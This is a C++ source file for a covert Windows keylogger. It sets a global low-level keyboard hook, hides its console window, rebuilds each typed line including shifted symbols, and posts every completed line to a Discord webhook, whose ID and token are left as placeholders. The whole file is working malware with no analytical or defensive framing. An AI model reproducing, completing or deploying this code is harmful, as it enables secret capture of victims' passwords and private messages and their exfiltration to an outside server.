#include <iostream>
#include <string>
#include <windows.h>
#include <fstream>
#include <winhttp.h>
#include <vector>
#include <thread>
#include <mutex>
#include <condition_variable>

bool isShiftPressed() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
}
bool isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}
bool shouldCapitalize() {
    return isShiftPressed() != isCapsLockOn();
}

std::vector<std::string> messages;
std::mutex messagesmutex;
std::string content = "";
std::condition_variable messagesCV;
bool exitProgram = false;

bool sendtowebhook(const std::string& content) {
    HINTERNET hSession = WinHttpOpen(L"webhook", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    WinHttpSetTimeouts(hSession, 200, 200, 200, 200);

    HINTERNET hConnect = WinHttpConnect(hSession, L"discord.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) {
        WinHttpCloseHandle(hSession);
        return false;
    }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    WinHttpSetTimeouts(hRequest, 200, 200, 200, 200);

    std::string jsondata = "{\"content\": \"" + content + "\"}";
    LPCWSTR headers = L"Content-Type: application/json";
    
    bool success = WinHttpSendRequest(hRequest, headers, -1L, (LPVOID)jsondata.c_str(), jsondata.length(), jsondata.length(), 0);
    if (success) {
        success = WinHttpReceiveResponse(hRequest, NULL);
    }

    DWORD statuscode = 0;
    DWORD statuscode_size = sizeof(statuscode);
    if (success) {
        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
                          WINHTTP_HEADER_NAME_BY_INDEX, &statuscode, &statuscode_size, 
                          WINHTTP_NO_HEADER_INDEX);
    }

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return (success && statuscode >= 200 && statuscode < 300);
}

void keyboard(int key) {

    if(key == VK_BACK) {
        if(!content.empty()) {
            content.pop_back();
        }
    }
    else if(key == VK_RETURN) {
        if(!content.empty()) {
            std::lock_guard<std::mutex> lock(messagesmutex);
            messages.push_back(content);
            content = "";
            messagesCV.notify_one();
        }
    }
    else if(key == VK_SPACE) {
        content += " ";
    }
    else if(key == VK_OEM_PERIOD) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? ">" : ".";
    }
    else if(key >= 'A' && key <= 'Z') {
        bool capitalize = shouldCapitalize();
        content += capitalize ? char(key) : char(key + 32);
    }
    else if(key >= '0' && key <= '9') {
        bool shiftPressed = isShiftPressed();
        if(shiftPressed) {
            if(char(key) == '0') {
                content += ")";
            }
            else if(char(key) == '1') {
                content += "!";
            }
            else if(char(key) == '2') {
                content += "@";
            }
            else if(char(key) == '3') {
                content += "#";
            }
            else if(char(key) == '4') {
                content += "$";
            }
            else if(char(key) == '5') {
                content += "%";
            }
            else if(char(key) == '6') {
                content += "^";
            }
            else if(char(key) == '7') {
                content += "&";
            }
            else if(char(key) == '8') {
                content += "*";
            }
            else if(char(key) == '9') {
                content += "(";
            }
        }
        else {
            content += char(key);
        }
    }
    else if(key == VK_OEM_COMMA) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "<" : ",";
    }
    else if(key == VK_OEM_1) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? ":" : ";";
    }
    else if(key == VK_OEM_2) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "?" : "/";
    }
    else if(key == VK_OEM_7) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "\"" : "'";
    }
    else if(key == VK_OEM_MINUS) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "_" : "-";
    }
    else if(key == VK_OEM_PLUS) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "+" : "=";
    }
    else if(key == VK_OEM_4) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "{" : "[";
    }
    else if(key == VK_OEM_6) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "}" : "]";
    }
    else if(key == VK_OEM_5) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "|" : "\\";
    }
    else if(key == VK_OEM_3) {
        bool shiftPressed = isShiftPressed();
        content += shiftPressed ? "~" : "`";
    }
}

LRESULT CALLBACK kb(int ncode, WPARAM wParam, LPARAM lParam) {
    if(ncode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pkb = (KBDLLHOOKSTRUCT*)lParam;
        int key = pkb->vkCode;
        keyboard(key);
    }
    return CallNextHookEx(NULL, ncode, wParam, lParam);
}

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
int main() {
    HWND hide_window = GetConsoleWindow();
    ShowWindow(hide_window, SW_HIDE);
    FreeConsole();

    std::thread([]() {
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
        FreeConsole();
        while(!exitProgram) {
            std::string messageToSend;
            {
                std::unique_lock<std::mutex> lock(messagesmutex);
                messagesCV.wait(lock, []{
                    return !messages.empty() || exitProgram;
                });
                if(exitProgram) {
                    break;
                }
                messageToSend = messages[0];
            }   
            bool success = sendtowebhook(messageToSend);   
            if(success) {
                std::lock_guard<std::mutex> lock(messagesmutex);
                if(!messages.empty() && messages[0] == messageToSend) {
                    messages.erase(messages.begin());
                }
            }
        }
    }).detach();

    std::thread([]() {
        SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
        HHOOK kbh = SetWindowsHookEx(WH_KEYBOARD_LL, kb, NULL, 0);
        MSG msg;
        while(GetMessage(&msg, NULL, 0 ,0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(kbh);
        exitProgram = true;
        messagesCV.notify_one();
    }).detach();

    while(true) {
        Sleep(10000);
    }

    return 0;
}